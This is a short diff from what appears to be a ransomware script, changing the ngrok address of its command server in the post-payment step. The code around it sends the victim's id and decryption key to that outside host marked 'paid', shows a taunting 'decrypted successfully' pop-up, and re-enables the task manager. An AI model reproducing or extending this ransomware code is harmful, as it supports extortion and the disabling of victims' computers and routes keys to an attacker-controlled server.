@@ -45,5 +45,5 @@ if __name__ == '__main__':
     pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")
 
     # TODO insert id
-    cm.send_post_request(url='http://9ca31b80390f.ngrok.io', id=id, key=key, mode='update', state='paid')
+    cm.send_post_request(url='http://204a586e623c.ngrok.io', id=id, key=key, mode='update', state='paid')
     cm.enable_task_manager()
